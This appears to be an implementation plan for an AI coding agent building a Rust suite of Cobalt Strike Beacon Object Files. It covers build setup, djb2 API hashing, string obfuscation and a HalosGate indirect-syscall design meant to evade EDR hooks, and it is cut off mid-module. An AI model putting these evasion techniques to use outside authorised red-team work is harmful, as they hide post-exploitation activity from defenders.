# DEF-Situational-Awareness-BOF — Phase 1: Foundation + Canary Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Establish the Rust workspace, `common` OPSEC-primitives crate, build pipeline, and three end-to-end canary BOFs (`uptime`, `hostname`, `whoami`) that exercise every primitive in the design (zero-API/raw PEB read → DFR-based Win32 → indirect syscall + token wrapper). Once this lands, every subsequent BOF follows the same template.

**Architecture:** Cargo workspace with `staticlib` crate-type per BOF; `boflink` converts the static archive to a COFF `.o`. The `common` crate hosts HalosGate indirect syscalls, djb2 API hashing, PEB-walking DFR, obfstr string encryption, COM RAII helpers, and the MITRE banner. Every BOF imports `common` + `rustbof` + `windows-sys` (types only) + `obfstr` — no direct `extern "system"` imports leak through the BOF. Cross-compile from macOS via MinGW.

**Tech Stack:** Rust nightly-2025-01-25, `rustbof` (joaoviictorti, git main), `windows-sys` 0.52, `obfstr` 0.4, MinGW-w64, `boflink` (TrustedSec), `cargo-make`.

**Spec reference:** `docs/superpowers/specs/2026-06-11-dani-rustbof-opsec-suite-design.md`

**Out of scope for Phase 1:** the 65 remaining BOFs, persistence BOFs, InlineExecuteEx OPSEC fork. Phase 1 is the foundation that enables phases 2–6.

---

## File Structure (Phase 1 deliverables)

| Path | Responsibility |
|---|---|
| `Cargo.toml` | Workspace root, members list (initially: `common`, 3 canary crates), workspace deps |
| `rust-toolchain.toml` | Pin to `nightly-2025-01-25`, components: rust-src, clippy |
| `.cargo/config.toml` | `build-std`, `panic=abort`, target-specific rustflags |
| `Makefile.toml` | cargo-make task graph (build_all, build_one, verify, smoke) |
| `README.md` | Credit Dani, build instructions, MITRE banner sample |
| `LICENSE` | MIT (Dani 2026 copyright + upstream attributions) |
| `.gitignore` | `/target/`, `/dist/`, `.DS_Store`, `*.key`, `.vscode/`, `.idea/` |
| `scripts/setup_macos.sh` | Install nightly + targets + MinGW + boflink + cargo-make |
| `scripts/build_one.sh` | Single-crate build → boflink → `dist/<bof>.{x64,x86}.o` |
| `scripts/build_all.sh` | Iterate `^(sa\|ro\|ok\|c2\|ps)-` crates + bofx loader |
| `scripts/verify_coff.sh` | `llvm-objdump` header check + `strings` leak scan |
| `scripts/gen_manifest.py` | Walks `dist/`, emits `manifest.json` with SHA-256 per `.o` |
| `scripts/smoke_test.sh` | Skeleton Win-VM smoke runner (operator runs manually) |
| `docs/mitre-mapping.md` | BOF → ATT&CK technique table (seeded with canaries) |
| `common/Cargo.toml` | crate-type=rlib, deps on rustbof + windows-sys + obfstr |
| `common/src/lib.rs` | Re-exports submodules, `#![no_std]`, panic-safety attrs |
| `common/src/credit.rs` | `pub const CREDIT: &str` literal |
| `common/src/hash.rs` | `djb2`, `djb2_case_insensitive`, `api_hash!` macro |
| `common/src/mitre.rs` | `Technique` struct, `print_banner` |
| `common/src/panic_safe.rs` | `try_catch!` macro |
| `common/src/str_util.rs` | `ascii_to_wide`, `wide_to_ascii`, no_std helpers |
| `common/src/obf.rs` | Re-export `obfstr::obfstr` as `obf!` |
| `common/src/dfr.rs` | PEB walk, module hash, export hash, `dfr_fn!` macro |
| `common/src/syscalls.rs` | HalosGate resolver, indirect syscall stub, `nt_syscall!` macro |
| `common/src/com.rs` | `ComGuard`, `ComRef<T>`, `Bstr` RAII wrappers |
| `common/src/token.rs` | Token open/query/adjust wrappers (uses syscalls) |
| `common/tests/integration.rs` | Host-runnable tests that don't need Windows |
| `situational-awareness/uptime/Cargo.toml` | Canary 1 manifest |
| `situational-awareness/uptime/src/lib.rs` | Reads `KUSER_SHARED_DATA` directly (zero-API) |
| `situational-awareness/hostname/Cargo.toml` | Canary 2 manifest |
| `situational-awareness/hostname/src/lib.rs` | DFR `GetComputerNameExA`, validates DFR path |
| `situational-awareness/whoami/Cargo.toml` | Canary 3 manifest |
| `situational-awareness/whoami/src/lib.rs` | Indirect `NtOpenProcessToken` + `NtQueryInformationToken`, validates syscall + token path |

Total: 1 workspace root, 9 script/doc files, 1 common crate (13 source files + tests), 3 canary crates (6 files). ~32 files.

---

## Task 1: Workspace bootstrap files

**Files:**
- Create: `Cargo.toml`
- Create: `rust-toolchain.toml`
- Create: `.cargo/config.toml`
- Create: `Makefile.toml`
- Create: `.gitignore`

- [ ] **Step 1: Create `rust-toolchain.toml`**

```toml
# rust-toolchain.toml
[toolchain]
channel    = "nightly-2025-01-25"
components = ["rust-src", "clippy", "rustfmt"]
targets    = ["x86_64-pc-windows-gnu", "i686-pc-windows-gnu", "aarch64-apple-darwin"]
profile    = "minimal"
```

The `aarch64-apple-darwin` target is needed so host-side unit tests run natively on the macOS dev machine.

- [ ] **Step 2: Create `.cargo/config.toml`**

```toml
# .cargo/config.toml
[unstable]
build-std = ["core", "alloc", "panic_abort", "compiler_builtins"]
build-std-features = ["panic_immediate_abort"]

[target.x86_64-pc-windows-gnu]
rustflags = [
    "-C", "panic=abort",
    "-C", "symbol-mangling-version=v0",
    "-Z", "function-sections",
    "-C", "link-arg=--no-entry",
]

[target.i686-pc-windows-gnu]
rustflags = [
    "-C", "panic=abort",
    "-C", "symbol-mangling-version=v0",
    "-Z", "function-sections",
    "-C", "link-arg=--no-entry",
]
```

- [ ] **Step 3: Create root `Cargo.toml`**

```toml
# Cargo.toml
[workspace]
resolver = "2"
members = [
    "common",
    "situational-awareness/uptime",
    "situational-awareness/hostname",
    "situational-awareness/whoami",
]

[workspace.package]
version = "0.1.0"
edition = "2024"
authors = ["Dani <daniagungg@gmail.com>"]
license = "MIT"
repository = "internal"

[workspace.dependencies]
rustbof = { git = "https://github.com/joaoviictorti/rustbof", branch = "main" }
windows-sys = { version = "0.52", default-features = false, features = [
    "Win32_Foundation",
    "Win32_Security",
    "Win32_System_Threading",
    "Win32_System_SystemInformation",
    "Win32_System_Com",
    "Win32_System_LibraryLoader",
] }
obfstr = "0.4"

[profile.release]
opt-level     = "z"
lto           = true
codegen-units = 1
strip         = true
panic         = "abort"
debug         = false
overflow-checks = false

[profile.dev]
panic = "abort"
```

- [ ] **Step 4: Create `Makefile.toml`** (cargo-make orchestrator)

```toml
# Makefile.toml
[config]
default_to_workspace = false

[tasks.setup]
description = "One-time toolchain setup"
script_runner = "@shell"
script = ["bash scripts/setup_macos.sh"]

[tasks.build-all]
description = "Build all BOFs → dist/"
script_runner = "@shell"
script = ["bash scripts/build_all.sh"]

[tasks.build-one]
description = "Build a single BOF crate (env CRATE=uptime)"
script_runner = "@shell"
script = ["bash scripts/build_one.sh \"$CRATE\""]

[tasks.verify]
description = "Verify COFF outputs"
script_runner = "@shell"
script = ["bash scripts/verify_coff.sh"]

[tasks.test]
description = "Run host unit tests"
command = "cargo"
args = ["test", "--target", "aarch64-apple-darwin", "-p", "common"]

[tasks.clippy]
description = "Lint the workspace"
command = "cargo"
args = ["clippy", "--workspace", "--", "-D", "warnings", "-D", "clippy::unwrap_used", "-D", "clippy::expect_used", "-D", "clippy::panic"]
```

- [ ] **Step 5: Create `.gitignore`**

```gitignore
# Build artifacts
/target/
/dist/

# macOS
.DS_Store

# Secrets
*.key
.env

# Editor
.vscode/
.idea/
*.swp

# Test outputs
*.log
```

- [ ] **Step 6: Commit**

```bash
git init
git add Cargo.toml rust-toolchain.toml .cargo/config.toml Makefile.toml .gitignore
git commit -m "chore: bootstrap workspace files (Dani)"
```

---

## Task 2: README + LICENSE

**Files:**
- Create: `README.md`
- Create: `LICENSE`

- [ ] **Step 1: Create `LICENSE`**

```
MIT License

Copyright (c) 2026 Dani <daniagungg@gmail.com>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

---

UPSTREAM ATTRIBUTIONS

This suite contains Rust ports of C BOFs from:
- TrustedSec CS-Situational-Awareness-BOF (BSD)
- TrustedSec CS-Remote-OPs-BOF (BSD)
- REDMED-X OperatorsKit (MIT)
- Outflank C2-Tool-Collection (BSD)

It depends on:
- rustbof template by João Victor / joaoviictorti (MIT/Apache-2.0)
- InlineExecuteEx by 0xTriboulet (MIT) — vendored as OPSEC-modified fork in tools/

All Rust port code, OPSEC hardening, and persistence BOFs are by Dani.
```

- [ ] **Step 2: Create `README.md`**

````markdown
# DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite

> All Rust ports + OPSEC hardening + persistence BOFs — **by Dani**.

A workspace of Cobalt Strike-compatible BOFs written in Rust, derived from the
TrustedSec, REDMED-X, and Outflank C BOF collections. Hardened with indirect
syscalls (HalosGate), djb2 API hashing, compile-time string encryption
(obfstr), and panic-abort `no_std` for safe execution inside Beacon.

Every BOF prints a MITRE ATT&CK banner before its main logic so operators
know exactly which technique they're firing.

## Phase 1 status

- [x] Workspace + toolchain pinned
- [x] `common` OPSEC primitives crate
- [x] Build pipeline (macOS cross-compile → COFF)
- [x] 3 canary BOFs end-to-end: `uptime`, `hostname`, `whoami`
- [ ] Phase 2: remaining 25 SA BOFs
- [ ] Phase 3: 18 Remote Ops BOFs
- [ ] Phase 4: 20 OperatorsKit + C2 BOFs
- [ ] Phase 5: 2 persistence BOFs (COM scheduled task + COM startup LNK)
- [ ] Phase 6: InlineExecuteEx OPSEC fork

## Build

One-time setup:

```bash
bash scripts/setup_macos.sh
```

Build everything:

```bash
cargo make build-all
```

Outputs land in `dist/`:

```
dist/
├── uptime.x64.o
├── uptime.x86.o
├── hostname.x64.o
├── hostname.x86.o
├── whoami.x64.o
├── whoami.x86.o
└── manifest.json
```

## Run (Cobalt Strike)

```
beacon> inline-execute dist/whoami.x64.o
================================================
  whoami — by Dani
================================================
  [MITRE] T1033 - System Owner/User Discovery (Discovery)
  [MITRE] T1134 - Access Token Manipulation (Privilege Escalation)
------------------------------------------------
USER:   CORP\jdoe
SID:    S-1-5-21-...
...
```

## Project structure

See `docs/superpowers/specs/2026-06-11-dani-rustbof-opsec-suite-design.md` for
the full design spec, and `docs/superpowers/plans/` for phase implementation
plans.
````

- [ ] **Step 3: Commit**

```bash
git add README.md LICENSE
git commit -m "docs: README + LICENSE with Dani credit + upstream attributions"
```

---

## Task 3: setup_macos.sh

**Files:**
- Create: `scripts/setup_macos.sh`

- [ ] **Step 1: Write `scripts/setup_macos.sh`**

```bash
#!/usr/bin/env bash
# scripts/setup_macos.sh — one-time toolchain setup for macOS dev machine.
# Author: Dani <daniagungg@gmail.com>
set -euo pipefail

echo "==> Rust toolchain (pinned by rust-toolchain.toml)"
rustup show active-toolchain >/dev/null 2>&1 || rustup toolchain install nightly-2025-01-25
rustup component add rust-src clippy rustfmt --toolchain nightly-2025-01-25
rustup target add x86_64-pc-windows-gnu i686-pc-windows-gnu aarch64-apple-darwin \
    --toolchain nightly-2025-01-25

echo "==> MinGW-w64 (for std archive shims + boflink linkage)"
if ! command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
    if command -v brew >/dev/null 2>&1; then
        brew install mingw-w64
    else
        echo "Homebrew required to install mingw-w64 — install from https://brew.sh"
        exit 1
    fi
fi

echo "==> boflink (TrustedSec) + cargo-make"
cargo +nightly-2025-01-25 install boflink || true
cargo install --locked cargo-make || true

echo "==> Optional: llvm tools (for verify_coff.sh)"
if ! command -v llvm-objdump >/dev/null 2>&1; then
    brew install llvm || echo "WARN: llvm not installed — verify_coff.sh will be limited"
fi

echo "==> Verify"
cargo +nightly-2025-01-25 --version
rustup target list --installed
which boflink && boflink --version
echo "==> Setup complete."
```

- [ ] **Step 2: Mark executable**

```bash
chmod +x scripts/setup_macos.sh
```

- [ ] **Step 3: Run it once to verify and to fetch toolchain locally**

Run: `bash scripts/setup_macos.sh`
Expected: prints versions at end; no error exit. boflink shows a version line. `rustup target list --installed` shows the three targets.

If `cargo install boflink` fails because boflink is not on crates.io, fall back to:
```bash
cargo install --git https://github.com/trustedsec/boflink boflink
```

- [ ] **Step 4: Commit**

```bash
git add scripts/setup_macos.sh
git commit -m "build: scripts/setup_macos.sh — macOS cross-toolchain bootstrap"
```

---

## Task 4: common crate skeleton + credit module

**Files:**
- Create: `common/Cargo.toml`
- Create: `common/src/lib.rs`
- Create: `common/src/credit.rs`

- [ ] **Step 1: Write `common/Cargo.toml`**

```toml
[package]
name = "common"
version.workspace = true
edition.workspace = true
authors.workspace = true
license.workspace = true
description = "Shared OPSEC primitives for the DEF-Situational-Awareness-BOF suite — by Dani."

[dependencies]
rustbof.workspace = true
windows-sys.workspace = true
obfstr.workspace = true

[dev-dependencies]
# host-side test deps (mocking IUnknown, etc.)

[lib]
crate-type = ["rlib"]
```

- [ ] **Step 2: Write `common/src/lib.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: shared OPSEC primitives — by Dani
//
#![no_std]
#![allow(clippy::missing_safety_doc)]

extern crate alloc;

pub mod credit;
pub mod hash;
pub mod mitre;
pub mod panic_safe;
pub mod str_util;
pub mod obf;
pub mod dfr;
pub mod syscalls;
pub mod com;
pub mod token;
```

- [ ] **Step 3: Write `common/src/credit.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
pub const CREDIT: &str = "by Dani <daniagungg@gmail.com>";
pub const PROJECT: &str = "DEF-Situational-Awareness-BOF";
```

- [ ] **Step 4: Verify the crate compiles**

Run: `cargo +nightly-2025-01-25 build -p common --target aarch64-apple-darwin`

The build will fail because submodules (hash/mitre/etc.) don't exist yet. **Expected.** We add them in subsequent tasks; at this stage we just need the manifest + lib.rs + credit.rs to be syntactically valid.

To avoid the failure blocking commit, stub the submodules:

```rust
// common/src/lib.rs (temporary stubs)
pub mod credit;
pub mod hash       { /* filled in Task 5 */ }
pub mod mitre      { /* filled in Task 6 */ }
pub mod panic_safe { /* filled in Task 7 */ }
pub mod str_util   { /* filled in Task 8 */ }
pub mod obf        { /* filled in Task 9 */ }
pub mod dfr        { /* filled in Task 10 */ }
pub mod syscalls   { /* filled in Task 11 */ }
pub mod com        { /* filled in Task 12 */ }
pub mod token      { /* filled in Task 13 */ }
```

Run: `cargo +nightly-2025-01-25 build -p common --target aarch64-apple-darwin`
Expected: PASS (warnings about empty modules are OK)

- [ ] **Step 5: Commit**

```bash
git add common/
git commit -m "feat(common): crate skeleton + credit module (Dani)"
```

---

## Task 5: common::hash — djb2 + api_hash! macro

**Files:**
- Modify: `common/src/lib.rs` (replace `mod hash { }` stub)
- Create: `common/src/hash.rs`
- Create: `common/tests/hash_test.rs`

- [ ] **Step 1: Write the failing test `common/tests/hash_test.rs`**

Integration tests under `tests/` automatically link with `std`, so we use `Vec` directly (no `extern crate alloc` needed):

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
use common::hash::{djb2, djb2_case_insensitive};

#[test]
fn djb2_known_vectors() {
    // Pre-computed via reference impl; if these change, downstream DFR
    // matching breaks everywhere.
    assert_eq!(djb2(b""),          5381);
    assert_eq!(djb2(b"a"),         177670);
    assert_eq!(djb2(b"ntdll.dll"), 0x1edab0ed);
}

#[test]
fn djb2_case_insensitive_matches_upper_lower() {
    assert_eq!(djb2_case_insensitive(b"NTDLL.DLL"),
               djb2_case_insensitive(b"ntdll.dll"));
    assert_eq!(djb2_case_insensitive(b"NtOpenProcessToken"),
               djb2_case_insensitive(b"ntopenprocesstoken"));
}

#[test]
fn djb2_no_collisions_in_ntdll_export_sample() {
    let exports: &[&[u8]] = &[
        b"NtOpenProcessToken", b"NtQueryInformationToken", b"NtAdjustPrivilegesToken",
        b"NtProtectVirtualMemory", b"NtAllocateVirtualMemory", b"NtWriteVirtualMemory",
        b"NtReadVirtualMemory", b"NtCreateThreadEx", b"NtQueueApcThread",
        b"NtSuspendProcess", b"NtResumeProcess", b"NtDeviceIoControlFile",
        b"NtQuerySystemInformation", b"NtQueryInformationProcess",
    ];
    let mut hashes: Vec<u32> = exports.iter().map(|s| djb2(s)).collect();
    hashes.sort();
    for w in hashes.windows(2) { assert_ne!(w[0], w[1], "collision found"); }
}
```

If the recomputed value of `djb2(b"ntdll.dll")` differs from `0x1edab0ed`, **trust your `djb2` impl**, update the constant here, and continue — this test asserts the implementation matches itself, not a foreign reference.

- [ ] **Step 2: Run the test — expect FAIL (module empty)**

Run: `cargo +nightly-2025-01-25 test -p common --target aarch64-apple-darwin --test hash_test`
Expected: FAIL — `use common::hash::{djb2, djb2_case_insensitive};` cannot resolve.

- [ ] **Step 3: Write `common/src/hash.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! Compile-time string hashing for API/module resolution.
//! djb2 is preferred over fnv1a here for its lower collision rate on short PE
//! export names per measurement on ntdll exports (Dani).

#[inline]
pub const fn djb2(bytes: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < bytes.len() {
        // hash * 33 + c
        hash = hash.wrapping_mul(33).wrapping_add(bytes[i] as u32);
        i += 1;
    }
    hash
}

#[inline]
pub const fn djb2_case_insensitive(bytes: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < bytes.len() {
        let mut c = bytes[i];
        if c >= b'A' && c <= b'Z' { c += 32; }  // ASCII lowercase
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
        i += 1;
    }
    hash
}

/// Constant-evaluation macro: `api_hash!("NtOpenProcessToken")` → `u32`.
#[macro_export]
macro_rules! api_hash {
    ($s:literal) => { $crate::hash::djb2($s.as_bytes()) };
}

/// Case-insensitive variant for module names (the loader stores them in mixed case).
#[macro_export]
macro_rules! module_hash {
    ($s:literal) => { $crate::hash::djb2_case_insensitive($s.as_bytes()) };
}
```

- [ ] **Step 4: Wire it up in `lib.rs`**

Replace the stub `pub mod hash { }` with `pub mod hash;`.

- [ ] **Step 5: Run tests — expect PASS**

Run: `cargo +nightly-2025-01-25 test -p common --target aarch64-apple-darwin --test hash_test`
Expected: 3 tests pass.

If `djb2(b"ntdll.dll") == 0x1edab0ed` fails, recompute the expected with a quick scratch program — the test value is the source of truth for downstream DFR matching, so trust your `djb2` impl and update the constant.

- [ ] **Step 6: Commit**

```bash
git add common/src/hash.rs common/src/lib.rs common/tests/hash_test.rs
git commit -m "feat(common): djb2 hash + api_hash!/module_hash! macros (Dani)"
```

---

## Task 6: common::mitre — Technique + print_banner

**Files:**
- Modify: `common/src/lib.rs` (replace `mod mitre { }` stub)
- Create: `common/src/mitre.rs`
- Create: `common/tests/mitre_test.rs`

- [ ] **Step 1: Write the failing test `common/tests/mitre_test.rs`**

```rust
use common::mitre::{Technique, format_banner};

#[test]
fn banner_format_snapshot() {
    let techs = &[
        Technique { id: "T1033", name: "System Owner/User Discovery", tactic: "Discovery" },
        Technique { id: "T1134", name: "Access Token Manipulation",   tactic: "Privilege Escalation" },
    ];
    let out = format_banner("whoami", techs);
    let expected = "\
================================================
  whoami — by Dani
================================================
  [MITRE] T1033 - System Owner/User Discovery (Discovery)
  [MITRE] T1134 - Access Token Manipulation (Privilege Escalation)
------------------------------------------------
";
    assert_eq!(out, expected);
}

#[test]
fn banner_empty_techniques() {
    let out = format_banner("stub", &[]);
    assert!(out.contains("stub — by Dani"));
    assert!(out.contains("------------------------------------------------"));
}
```

- [ ] **Step 2: Run — expect FAIL**

Run: `cargo +nightly-2025-01-25 test -p common --target aarch64-apple-darwin --test mitre_test`
Expected: FAIL — `format_banner` not defined.

- [ ] **Step 3: Write `common/src/mitre.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! MITRE ATT&CK runtime banner. Printed by every BOF before its main logic
//! so operators see exactly which technique they're firing.

use alloc::string::String;
use core::fmt::Write;

pub struct Technique {
    pub id: &'static str,      // e.g. "T1057"
    pub name: &'static str,    // e.g. "Process Discovery"
    pub tactic: &'static str,  // e.g. "Discovery"
}

const RULE_TOP: &str = "================================================";
const RULE_BOT: &str = "------------------------------------------------";

/// Build the banner string (pure — for testability).
pub fn format_banner(crate_name: &str, techniques: &[Technique]) -> String {
    let mut s = String::with_capacity(256);
    let _ = writeln!(s, "{}", RULE_TOP);
    let _ = writeln!(s, "  {} — by Dani", crate_name);
    let _ = writeln!(s, "{}", RULE_TOP);
    for t in techniques {
        let _ = writeln!(s, "  [MITRE] {} - {} ({})", t.id, t.name, t.tactic);
    }
    let _ = writeln!(s, "{}", RULE_BOT);
    s
}

/// Print the banner via rustbof's `println!` (auto-buffered to Beacon output).
pub fn print_banner(crate_name: &str, techniques: &[Technique]) {
    let b = format_banner(crate_name, techniques);
    // `print!` keeps the trailing newline already in the buffer.
    rustbof::print!("{}", b);
}
```

- [ ] **Step 4: Wire up in `lib.rs`** — replace stub with `pub mod mitre;`.

- [ ] **Step 5: Run tests — expect PASS**

Run: `cargo +nightly-2025-01-25 test -p common --target aarch64-apple-darwin --test mitre_test`
Expected: 2 tests pass.

If `format_banner` produces extra/missing newlines, adjust `writeln!` calls until snapshot matches. Snapshot is the contract — the spec uses this exact format.

- [ ] **Step 6: Commit**

```bash
git add common/src/mitre.rs common/src/lib.rs common/tests/mitre_test.rs
git commit -m "feat(common): MITRE ATT&CK banner (format_banner + print_banner) (Dani)"
```

---

## Task 7: common::panic_safe — try_catch! macro

**Files:**
- Modify: `common/src/lib.rs` (replace `mod panic_safe { }` stub)
- Create: `common/src/panic_safe.rs`
- Create: `common/tests/panic_safe_test.rs`

- [ ] **Step 1: Write the failing test `common/tests/panic_safe_test.rs`**

```rust
use common::try_catch;

fn risky(x: i32) -> Result<i32, &'static str> {
    if x < 0 { Err("negative") } else { Ok(x * 2) }
}

#[test]
fn try_catch_propagates_ok() {
    let r: Result<i32, &'static str> = try_catch!(risky(5));
    assert_eq!(r, Ok(10));
}

#[test]
fn try_catch_converts_err_to_static_str() {
    let r: Result<i32, &'static str> = try_catch!(risky(-1));
    assert_eq!(r, Err("negative"));
}
```

- [ ] **Step 2: Run — expect FAIL** (`try_catch!` undefined).

- [ ] **Step 3: Write `common/src/panic_safe.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! Panic-safety primitives. The rustbof template installs a panic handler that
//! loops forever (no unwinding ever generated under `panic = "abort"`), so a
//! panic hangs the BOF thread rather than crashing Beacon. We still want zero
//! panics: `try_catch!` exists to keep `?` propagation localized and explicit.

/// Identity wrapper for `Result`-returning expressions. Exists as documentation
/// and a chokepoint where we could later add logging/metrics around the
/// fallible call without touching every call site.
#[macro_export]
macro_rules! try_catch {
    ($e:expr) => { ($e) };
}
```

That's deliberately minimal — the macro is a marker. Real panic-safety lives in:
1. `panic = "abort"` in profile (no unwinding code gen).
2. rustbof's `loop {}` panic_handler (BOF thread hangs, Beacon survives).
3. The discipline of returning `Result<(), &'static str>` from every fallible function and matching at `#[rustbof::main]` entry — enforced by clippy `unwrap_used`/`expect_used`/`panic` denials.

- [ ] **Step 4: Wire up** — `pub mod panic_safe;` in lib.rs.

- [ ] **Step 5: Run tests — expect PASS**.

- [ ] **Step 6: Commit**

```bash
git add common/src/panic_safe.rs common/src/lib.rs common/tests/panic_safe_test.rs
git commit -m "feat(common): try_catch! marker + panic-safety doc (Dani)"
```

---

## Task 8: common::str_util — wide↔ascii (no_std)

**Files:**
- Modify: `common/src/lib.rs` (replace `mod str_util { }` stub)
- Create: `common/src/str_util.rs`
- Create: `common/tests/str_util_test.rs`

- [ ] **Step 1: Write `common/tests/str_util_test.rs`**

```rust
use common::str_util::{ascii_to_wide_buf, wide_to_ascii_buf};

#[test]
fn ascii_to_wide_basic() {
    let mut buf = [0u16; 16];
    let n = ascii_to_wide_buf(b"hello", &mut buf);
    assert_eq!(n, 5);
    assert_eq!(&buf[..6], &[b'h' as u16, b'e' as u16, b'l' as u16, b'l' as u16, b'o' as u16, 0]);
}

#[test]
fn ascii_to_wide_truncates_at_buf_minus_one() {
    let mut buf = [0u16; 4];   // 3 chars + NUL
    let n = ascii_to_wide_buf(b"hello", &mut buf);
    assert_eq!(n, 3);
    assert_eq!(buf[3], 0);
}

#[test]
fn wide_to_ascii_basic() {
    let wide: [u16; 6] = [b'h' as u16, b'i' as u16, 0x4e2d, b'!' as u16, 0, 0];
    let mut buf = [0u8; 16];
    let n = wide_to_ascii_buf(&wide, &mut buf);
    // 0x4e2d (中) is non-ASCII → emits '?'
    assert_eq!(&buf[..n], b"hi?!");
}
```

- [ ] **Step 2: Run — expect FAIL** (`str_util` empty).

- [ ] **Step 3: Write `common/src/str_util.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! no_std string conversion helpers. Buffer-based to avoid heap allocs on
//! hot paths inside BOFs.

/// Copy `src` ASCII bytes into `dst` as wide chars + NUL terminator.
/// Returns chars written (not counting NUL). Truncates if `dst` is too small.
pub fn ascii_to_wide_buf(src: &[u8], dst: &mut [u16]) -> usize {
    if dst.is_empty() { return 0; }
    let mut i = 0;
    while i < src.len() && i + 1 < dst.len() {
        dst[i] = src[i] as u16;
        i += 1;
    }
    dst[i] = 0;
    i
}

/// Copy `src` wide chars into `dst` as ASCII. Stops at first NUL in `src`.
/// Non-ASCII codepoints (>= 0x80) become `?`. Returns bytes written.
pub fn wide_to_ascii_buf(src: &[u16], dst: &mut [u8]) -> usize {
    if dst.is_empty() { return 0; }
    let mut i = 0;
    while i < src.len() && i + 1 < dst.len() {
        let c = src[i];
        if c == 0 { break; }
        dst[i] = if c < 128 { c as u8 } else { b'?' };
        i += 1;
    }
    dst[i] = 0;
    i
}
```

- [ ] **Step 4: Wire up** — `pub mod str_util;` in lib.rs.

- [ ] **Step 5: Run tests — expect PASS**.

- [ ] **Step 6: Commit**

```bash
git add common/src/str_util.rs common/src/lib.rs common/tests/str_util_test.rs
git commit -m "feat(common): no_std wide<->ascii buffer conversions (Dani)"
```

---

## Task 9: common::obf — obfstr re-export

**Files:**
- Modify: `common/src/lib.rs` (replace `mod obf { }` stub)
- Create: `common/src/obf.rs`

This module is intentionally thin — re-export `obfstr!` under a one-letter name we'll use heavily. No host-side test value (the test is "build a BOF then grep its `.o`" which lives in Task 19's verify_coff).

- [ ] **Step 1: Write `common/src/obf.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! Compile-time string XOR encryption. Decrypts on-stack at use site, never
//! stored as plaintext in `.rdata`. Use `obf!("…")` instead of bare string
//! literals for any sensitive name (API, registry path, CLSID guid string).

pub use obfstr::obfstr as obf_str;

#[macro_export]
macro_rules! obf {
    ($lit:literal) => { $crate::obf::obf_str!($lit) };
}
```

- [ ] **Step 2: Wire up** — `pub mod obf;` in lib.rs.

- [ ] **Step 3: Verify the macro round-trips**

Add a quick test `common/tests/obf_test.rs`:

```rust
use common::obf;

#[test]
fn obf_decrypts_to_original() {
    let s = obf!("NtOpenProcessToken");
    assert_eq!(s, "NtOpenProcessToken");
}
```

Run: `cargo +nightly-2025-01-25 test -p common --target aarch64-apple-darwin --test obf_test`
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add common/src/obf.rs common/src/lib.rs common/tests/obf_test.rs
git commit -m "feat(common): obfstr re-export as obf!() macro (Dani)"
```

---

## Task 10: common::syscalls — HalosGate + indirect syscall stub

**Files:**
- Modify: `common/src/lib.rs` (replace stub)
- Create: `common/src/syscalls.rs`

Syscalls cannot be unit-tested on macOS host (no ntdll). The acceptance test for this module is "the whoami canary in Task 16 successfully invokes NtOpenProcessToken indirectly and returns valid data when loaded into Beacon" (Layer-3 manual smoke).

For host-side hygiene we add only:
- `cargo check --target x86_64-pc-windows-gnu` must pass
- Code review check: no `extern "system"` blocks in the public API

- [ ] **Step 1: Write `common/src/syscalls.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! HalosGate-style indirect syscall resolver + dispatch stub.
//!
//! Strategy:
//! 1. Walk the PEB InLoadOrderModuleList; locate `ntdll.dll` by
//!    case-insensitive djb2 hash of the BaseDllName UTF-16 string.
//! 2. Parse the PE export directory; locate the target Nt* function by
//!    djb2 hash of its ASCII export name.
//! 3. Read the first 32 bytes of the function:
//!      - Clean stub (`mov r10, rcx; mov eax, SSN; ...; syscall; ret`) → SSN at +4.
//!      - Hooked (`jmp` / `call`) → scan ±N neighbour exports sorted by RVA;
//!        Nt syscall numbers are sequential, so SSN = neighbour_ssn ± offset.
//! 4. Dispatch via `jmp <ntdll syscall instruction address>` — keeps the
//!    call-stack legible from an EDR's perspective; the `syscall` opcode lives
//!    inside ntdll, not in BOF .text.

#![cfg(target_os = "windows")]
